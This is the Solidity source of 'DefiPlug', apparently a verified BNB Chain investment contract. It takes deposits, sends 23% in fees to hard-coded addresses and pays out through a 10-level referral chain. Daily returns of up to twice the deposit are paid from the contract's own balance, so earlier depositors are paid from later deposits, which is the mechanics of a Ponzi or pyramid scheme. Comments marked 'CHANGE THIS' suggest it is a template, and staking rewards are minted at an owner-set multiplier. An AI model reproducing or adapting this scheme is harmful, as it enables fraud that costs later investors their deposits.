/**
 *Submitted for verification at BscScan.com on 2021-12-25
*/

// SPDX-License-Identifier: NONE

pragma solidity >=0.7.0;


library SafeMath {
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
        return (true, a - b);
    }

    
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        
        
        
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }

    
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }

    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

    
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; 
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    
    constructor ()  {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    
    function owner() public view virtual returns (address) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

    
    function allowance(address owner, address spender) external view returns (uint256);

    
    function approve(address spender, uint256 amount) external returns (bool);

    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


// pragma solidity >=0.5.0;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}



interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}



interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}




interface IMintableToken  {

  function mint(address _receiver, uint256 _amount) external;

}

contract DefiPlug is Ownable {
    using SafeMath for uint256;

    uint256 constant public DEPOSITS_MAX = 1000000; // Maximum deposit bnb
    uint256 constant public INVEST_MIN_AMOUNT = 0.01 ether; // Minimum deposit bnb
    uint256[] public REFERRAL_LEVELS_PERCENTS = [800, 220, 150, 120, 60,50, 40, 30, 20, 10];
    uint8 constant public REFERRAL_DEPTH = 10; // referal max level
    uint8 constant public REFERRAL_TURNOVER_DEPTH = 10; // max level depth

    address payable constant public DEFAULT_REFERRER_ADDRESS = 0xB21969a2e6aA265ec9bDa3C0244ac30DDE47f09e; //CHANGE THIS

    
    address payable constant public MARKETING_ADDRESS = 0x0eF12aa472432162dc9cD9e54436B55700E16276; //CHANGE THIS
    uint256 constant public MARKETING_FEE = 1500; // 15% each 
    address payable constant public PROMOTION_ADDRESS = 0xB62088D09a951998A03178B8F04253668985b2d7; //CHANGE THIS
    uint256 constant public PROMOTION_FEE = 500; // 5% each 
    address payable constant public LIQUIDITY_ADDRESS = 0x87fC9f7eDc92A9629DD387a948ad9C5163f91ad1; //CHANGE THIS
    uint256 constant public LIQUIDITY_FEE = 300;  // 3% each

    uint256 constant public BASE_PERCENT = 100; // 1%

    
    uint256 constant public MAX_HOLD_PERCENT = 10000; //max hold percent
    uint256 constant public HOLD_BONUS_PERCENT = 10; // 0.1 % percent

    
    uint256 constant public MAX_CONTRACT_PERCENT = 10000; 
    uint256 constant public CONTRACT_BALANCE_STEP = 200 ether; 
    uint256 constant public CONTRACT_HOLD_BONUS_PERCENT = 20; 

    
    //--------------DEFI PLUG BONUSES constant--------------
    uint256 constant public MAX_DEPOSIT_PERCENT = 10000; // 
    uint256 constant public USER_DEPOSITS_STEP = 10 ether; // BONUS TRIGGER AT THIS QUANTITY
    uint256 constant public DEFI_BONUS_PERCENT = 10; //0.1% on each and every 10 Bnb 

    uint256 constant public LEADERSHIP_BONUS_PERCENT=50;

    uint256 constant public TIME_STEP = 1 days;
    uint256 constant public PERCENTS_DIVIDER = 10000;

    uint256 public totalDeposits;
    uint256 public totalInvested;
    uint256 public totalWithdrawn;

   
    uint256 public contractPercent;

    address public tokenContractAddress;
    address public uniswapV2Pair;
    struct Token {
      address tokenContractAddress;
      address flipTokenContractAddress;
      uint256 rate; 
    }
    mapping (address => Token) tokens;
    mapping (address => address) flipTokens;

    struct Stake {
      uint256 amount;
      uint256 checkpoint;
      uint256 checkpointHold;
      uint256 accumulatedReward;
      uint256 withdrawnReward;
    }
    

    mapping (address => mapping (address => Stake)) stakes;
    //user downline
    mapping(address=> address[]) public user30Downlines;
 
    // for staking    
    uint256 constant public HOLD_BONUS_PERCENT_STAKE = 10; 
    uint256 constant public HOLD_BONUS_PERCENT_LIMIT = 10000; 

    
    uint256 constant public USER_DEPOSITS_STEP_STAKE = 10 ether; 
    uint256 constant public VIP_BONUS_PERCENT_STAKE = 100; 
    uint256 constant public VIP_BONUS_PERCENT_LIMIT = 100000; 
    uint256 public MULTIPLIER = 3;

    struct Deposit {
        uint256 amount;
        uint256 withdrawn;
        uint256 refback;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        uint256 bonus;
        uint256[REFERRAL_DEPTH] refs;
        uint256[REFERRAL_DEPTH] refsNumber;
        uint16 rbackPercent;
        uint8 refLevel;
        uint256 refTurnover;
    }

    mapping (address => User) public users;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
    event RefBack(address indexed referrer, address indexed referral, uint256 amount);
    event FeePayed(address indexed user, uint256 totalAmount);

    
    event Staked(address indexed user, address indexed tokenContractAddress, address indexed flipTokenContractAddress, uint256 amount);
    event Unstaked(address indexed user, address indexed tokenContractAddress, address indexed flipTokenContractAddress, uint256 amount);
    event RewardWithdrawn(address indexed user, address indexed tokenContractAddress, address indexed flipTokenContractAddress, uint256 reward);

    constructor() {
        contractPercent = getContractBalanceRate();

    }

    function invest(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 0.01 BNB");

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 1000000 deposits from address");

        uint256 marketingFee = msg.value.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint256 promotionFee = msg.value.mul(PROMOTION_FEE).div(PERCENTS_DIVIDER);
        uint256 liquidityFee = msg.value.mul(LIQUIDITY_FEE).div(PERCENTS_DIVIDER);

        MARKETING_ADDRESS.transfer(marketingFee);
        PROMOTION_ADDRESS.transfer(promotionFee);
        LIQUIDITY_ADDRESS.transfer(liquidityFee);

        emit FeePayed(msg.sender, marketingFee.add(promotionFee).add(liquidityFee));
        address upline;

        bool isNewUser = false;
        if (user.referrer == address(0)) {
            isNewUser = true;
            if (isActive(referrer) && referrer != msg.sender) {
              user.referrer = referrer;
            } else {
              user.referrer = DEFAULT_REFERRER_ADDRESS;
            }
        }

        uint256 refbackAmount;
        if (user.referrer != address(0)) {
            // bool[] memory distributedLevels = new bool[](REFERRAL_LEVELS_PERCENTS.length);

            address current = msg.sender;
            upline = user.referrer;
            // uint8 maxRefLevel = 0;
            for (uint256 i = 0; i < REFERRAL_DEPTH; i++) {
                if (upline != address(0)) {
                    uint amount = msg.value.mul(REFERRAL_LEVELS_PERCENTS[i]).div(PERCENTS_DIVIDER);

                    // }

                    if (amount > 0) {
                        address(uint160(upline)).transfer(amount);// send token of this amount
                        users[upline].bonus = uint64(uint(users[upline].bonus).add(amount));
                        
                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    if (isNewUser) {
                        users[upline].refsNumber[i]++;
                    }
                    current = upline;
                    upline = users[upline].referrer;
                } else break;
            }

            upline = user.referrer;
            for (uint256 i = 0; i < REFERRAL_TURNOVER_DEPTH; i++) {
                if (upline == address(0)) {
                  break;
                }

                // updateReferralLevel(upline, msg.value);

                upline = users[upline].referrer;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(msg.value, 0, refbackAmount, uint32(block.timestamp)));

        totalInvested = totalInvested.add(msg.value);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint256 contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, msg.value);

        
        if (isContract(tokenContractAddress)) {
          //token miniting to msg.sender
          IMintableToken(tokenContractAddress).mint(msg.sender, msg.value.mul(tokens[tokenContractAddress].rate));
        }
        
        //store user30Downlines 
        user30Downlines[user.referrer].push(msg.sender);
        
 
        // address payable _upline = payable(upline);
        // string memory _role;
        
        
        
    }
    
    
    

    function withdraw() public {
        
        //there is two types of reward one reward is in bnb and other one in token form
        
        User storage user = users[msg.sender];

        uint256 userPercentRate = getUserPercentRate(msg.sender);

        uint256 totalAmount;
        uint256 dividends;

        for (uint8 i = 0; i < user.deposits.length; i++) {

            if (uint256(user.deposits[i].withdrawn) < uint256(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint256(user.deposits[i].withdrawn).add(dividends) > uint256(user.deposits[i].amount).mul(2)) {
                    dividends = (uint256(user.deposits[i].amount).mul(2)).sub(uint256(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint256(user.deposits[i].withdrawn).add(dividends); 
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        uint256 contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }

        user.checkpoint = uint32(block.timestamp);

        msg.sender.transfer(totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);

        emit Withdrawn(msg.sender, totalAmount);
    }

    function setRefback(uint16 rbackPercent) public {
        require(rbackPercent <= 10000);

        User storage user = users[msg.sender];

        if (user.deposits.length > 0) {
            user.rbackPercent = rbackPercent;
        }
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getContractBalanceRate() public view returns (uint256) {
        uint256 contractBalance = address(this).balance;
        uint256 contractBalancePercent = BASE_PERCENT.add(
          contractBalance
            .div(CONTRACT_BALANCE_STEP)
            .mul(CONTRACT_HOLD_BONUS_PERCENT)
        );

        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }

    function getUserDepositRate(address userAddress) public view returns (uint256) {
        // defiPlug Bonus calculation
        uint256 userDepositRate;
        
        if (getUserAmountOfDeposits(userAddress) > 0) {
            userDepositRate = getUserTotalDeposits(userAddress).div(USER_DEPOSITS_STEP).mul(DEFI_BONUS_PERCENT);

            if (userDepositRate > MAX_DEPOSIT_PERCENT) {
                userDepositRate = MAX_DEPOSIT_PERCENT;
            }
        }

        return userDepositRate;
    }

    //hold balance percentage 
    function getUserPercentRate(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];
        uint256 hold_time_step = 3 days; // 72 hours
        if (isActive(userAddress)) {
            uint256 userDepositRate = getUserDepositRate(userAddress);
            uint256  userDirectRate = getUserLeadershipRate(userAddress);
            uint256 timeMultiplier = (block.timestamp.sub(uint256(user.checkpoint))).div(hold_time_step).mul(HOLD_BONUS_PERCENT);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }

            return contractPercent.add(timeMultiplier).add(userDepositRate).add(userDirectRate);
        } else {
            return contractPercent;
        }
    }



    function getUserLeadershipRate(address userAddress) public view returns(uint256){
        
        uint256 activeCount=0;
        for(uint256 i=0;i<user30Downlines[userAddress].length;i++){
            
            if(isActive(user30Downlines[userAddress][i])){
                
                activeCount++;
            }
        }
        
        if(activeCount>=30){
            
            return LEADERSHIP_BONUS_PERCENT;
        }
        
        return 0;
        
    }

    function getUserAvailable(address userAddress) public view returns (uint256) {
        User memory user = users[userAddress];

        uint256 userPercentRate = getUserPercentRate(userAddress);

        uint256 totalDividends;
        uint256 dividends;

        for (uint8 i = 0; i < user.deposits.length; i++) {

            if (uint256(user.deposits[i].withdrawn) < uint256(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint256(user.deposits[i].withdrawn).add(dividends) > uint256(user.deposits[i].amount).mul(2)) {
                    dividends = (uint256(user.deposits[i].amount).mul(2)).sub(uint256(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);
            }

        }

        return totalDividends;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint256(user.deposits[user.deposits.length-1].withdrawn) < uint256(user.deposits[user.deposits.length-1].amount).mul(2);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 amount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].amount);
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 amount = user.bonus;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(user.deposits[i].withdrawn).add(user.deposits[i].refback);
        }

        return amount;
    }

    function getUserDeposits(address userAddress, uint256 last, uint256 first) public view
      returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
        User storage user = users[userAddress];

        uint256 count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint256[] memory amount = new uint256[](count);
        uint256[] memory withdrawn = new uint256[](count);
        uint256[] memory refback = new uint256[](count);
        uint256[] memory start = new uint256[](count);

        uint256 index = 0;
        for (uint256 i = first; i > last; i--) {
            amount[index] = user.deposits[i-1].amount;
            withdrawn[index] = user.deposits[i-1].withdrawn;
            refback[index] = user.deposits[i-1].refback;
            start[index] = uint256(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint256, uint256, uint256, uint256) {
        return (totalInvested, totalDeposits, address(this).balance, contractPercent);
    }

    function getUserStats(address userAddress) public view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        uint256 userPerc = getUserPercentRate(userAddress);
        uint256 userAvailable = getUserAvailable(userAddress);
        uint256 userDepsTotal = getUserTotalDeposits(userAddress);
        uint256 userDeposits = getUserAmountOfDeposits(userAddress);
        uint256 userWithdrawn = getUserTotalWithdrawn(userAddress);
        uint256 userDepositRate = getUserDepositRate(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn, userDepositRate);
    }

    function getDepositsRates(address userAddress) public view returns (uint256, uint256, uint256, uint256) {
      User memory user = users[userAddress];

      uint256 holdBonusPercent = (block.timestamp.sub(uint256(user.checkpoint))).div(TIME_STEP).mul(HOLD_BONUS_PERCENT);
      if (holdBonusPercent > MAX_HOLD_PERCENT) {
          holdBonusPercent = MAX_HOLD_PERCENT;
      }

      return (
        BASE_PERCENT, 
        !isActive(userAddress) ? 0 : holdBonusPercent, 
        address(this).balance.div(CONTRACT_BALANCE_STEP).mul(CONTRACT_HOLD_BONUS_PERCENT), 
        !isActive(userAddress) ? 0 : getUserDepositRate(userAddress) 
      );
    }

    function getUserReferralsStats(address userAddress) public view
      returns (address, uint16, uint16, uint256, uint256[REFERRAL_DEPTH] memory, uint256[REFERRAL_DEPTH] memory, uint256, uint256) {
        User storage user = users[userAddress];

        return (
          user.referrer,
          user.rbackPercent,
          users[user.referrer].rbackPercent,
          user.bonus,
          user.refs,
          user.refsNumber,
          user.refLevel,
          user.refTurnover
        );
    }
    


    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }


    //-------------------------------------------------------TokenPair Function------------------------------------- 

    function setTokenContractAddress(address _tokenContractAddress, uint256 _rate) external onlyOwner {
      require(_rate > 0 && _rate <= 1000, "Invalid rate value");
      require(isContract(_tokenContractAddress), "Provided address is not a token contract address");
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
         // Create a uniswap pair for this new token
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
      require(isContract(uniswapV2Pair), "Provided address is not a flip token contract address");

      tokenContractAddress = _tokenContractAddress;
      tokens[_tokenContractAddress] = Token(_tokenContractAddress, uniswapV2Pair, _rate);
      flipTokens[uniswapV2Pair] = _tokenContractAddress;
    }

    function getStakeVIPBonusRate(address userAddress, address flipTokenContractAddress) public view returns (uint256) {
        uint256 vipBonusRate = stakes[userAddress][flipTokenContractAddress].amount.div(USER_DEPOSITS_STEP_STAKE).mul(VIP_BONUS_PERCENT_STAKE);
        if (vipBonusRate > VIP_BONUS_PERCENT_LIMIT) {
          return VIP_BONUS_PERCENT_LIMIT;
        }
        return vipBonusRate;
    }


    function getStakeHOLDBonusRate(address userAddress, address flipTokenContractAddress) public view returns (uint256) {
        if (stakes[userAddress][flipTokenContractAddress].checkpointHold == 0) {
          return 0;
        }

        uint256 holdBonusRate = (block.timestamp.sub(stakes[userAddress][flipTokenContractAddress].checkpointHold)).div(TIME_STEP).mul(HOLD_BONUS_PERCENT_STAKE);

        if (holdBonusRate > HOLD_BONUS_PERCENT_LIMIT) {
          return HOLD_BONUS_PERCENT_LIMIT;
        }

        return holdBonusRate;
    }

    function getUserStakePercentRate(address userAddress, address flipTokenContractAddress) public view returns (uint256) {
        return getStakeVIPBonusRate(userAddress, flipTokenContractAddress)
          .add(getStakeHOLDBonusRate(userAddress, flipTokenContractAddress));
   }

    function stake(address _flipTokenContractAddress, uint256 _amount) external returns (bool) {
      require(_amount > 0, "Invalid tokens amount value");
      require(isContract(_flipTokenContractAddress), "Provided address is not a flip token contract address");

      if (!IERC20(_flipTokenContractAddress).transferFrom(msg.sender, address(this), _amount)) {
        return false;
      }

      uint256 reward = availableReward(msg.sender, _flipTokenContractAddress);
      if (reward > 0) {
        stakes[msg.sender][_flipTokenContractAddress].accumulatedReward = stakes[msg.sender][_flipTokenContractAddress].accumulatedReward.add(reward);
      }

      stakes[msg.sender][_flipTokenContractAddress].amount = stakes[msg.sender][_flipTokenContractAddress].amount.add(_amount);
      stakes[msg.sender][_flipTokenContractAddress].checkpoint = block.timestamp;
      if (stakes[msg.sender][_flipTokenContractAddress].checkpointHold == 0) {
        stakes[msg.sender][_flipTokenContractAddress].checkpointHold = block.timestamp;
      }

      emit Staked(msg.sender, flipTokens[_flipTokenContractAddress], _flipTokenContractAddress, _amount);

      return true;
    }

    function availableReward(address userAddress, address flipTokenContractAddress) public view returns (uint256) {
      uint256 userPercentRate = getUserStakePercentRate(userAddress, flipTokenContractAddress);

      return (stakes[userAddress][flipTokenContractAddress].amount
        .mul(PERCENTS_DIVIDER.add(userPercentRate)).div(PERCENTS_DIVIDER))
        .mul(MULTIPLIER)
        .mul(block.timestamp.sub(stakes[userAddress][flipTokenContractAddress].checkpoint))
        .div(TIME_STEP);
    }

    function withdrawReward(address _flipTokenContractAddress) external {
      uint256 reward = stakes[msg.sender][_flipTokenContractAddress].accumulatedReward
        .add(availableReward(msg.sender, _flipTokenContractAddress));

      if (reward > 0) {
        address _tokenContractAddress = flipTokens[_flipTokenContractAddress];

        
        if (isContract(_tokenContractAddress)) {
          stakes[msg.sender][_flipTokenContractAddress].checkpoint = block.timestamp;
          stakes[msg.sender][_flipTokenContractAddress].accumulatedReward = 0;
          stakes[msg.sender][_flipTokenContractAddress].withdrawnReward = stakes[msg.sender][_flipTokenContractAddress].withdrawnReward.add(reward);

          IMintableToken(_tokenContractAddress).mint(msg.sender, reward);

          emit RewardWithdrawn(msg.sender, _tokenContractAddress, _flipTokenContractAddress, reward);
        }
      }
    }

    function unstake(address _flipTokenContractAddress, uint256 _amount) external {
      require(_amount > 0, "Invalid tokens amount value");
      require(_amount <= stakes[msg.sender][_flipTokenContractAddress].amount, "Not enough tokens on the stake balance");
      require(isContract(_flipTokenContractAddress), "Provided address is not a flip token contract address");

      uint256 reward = availableReward(msg.sender, _flipTokenContractAddress);
      if (reward > 0) {
        stakes[msg.sender][_flipTokenContractAddress].accumulatedReward = stakes[msg.sender][_flipTokenContractAddress].accumulatedReward.add(reward);
      }

      stakes[msg.sender][_flipTokenContractAddress].amount = stakes[msg.sender][_flipTokenContractAddress].amount.sub(_amount);
      stakes[msg.sender][_flipTokenContractAddress].checkpoint = block.timestamp;
      if (stakes[msg.sender][_flipTokenContractAddress].amount > 0) {
        stakes[msg.sender][_flipTokenContractAddress].checkpointHold = block.timestamp;
      } else {
        stakes[msg.sender][_flipTokenContractAddress].checkpointHold = 0; 
      }

      require(IERC20(_flipTokenContractAddress).transfer(msg.sender, _amount));

      emit Unstaked(msg.sender, flipTokens[_flipTokenContractAddress], _flipTokenContractAddress, _amount);
    }

    function getUserStakeStats(address _userAddress, address _flipTokenContractAddress) public view
      returns (uint256, uint256, uint256, uint256, uint256)
   {
      return (
        stakes[_userAddress][_flipTokenContractAddress].amount,
        stakes[_userAddress][_flipTokenContractAddress].accumulatedReward,
        stakes[_userAddress][_flipTokenContractAddress].withdrawnReward,
        getStakeVIPBonusRate(_userAddress, _flipTokenContractAddress),
        getStakeHOLDBonusRate(_userAddress, _flipTokenContractAddress)
     );
    }

    function getUserStakeTimeCheckpoints(address _userAddress, address _flipTokenContractAddress) public view returns (uint256, uint256) {
      return (
        stakes[_userAddress][_flipTokenContractAddress].checkpoint,
        stakes[_userAddress][_flipTokenContractAddress].checkpointHold
      );
    }

    function updateMultiplier(uint256 multiplier) public onlyOwner {
      require(multiplier > 0 && multiplier <= 50, "Multiplier is out of range");

      MULTIPLIER = multiplier;
    }

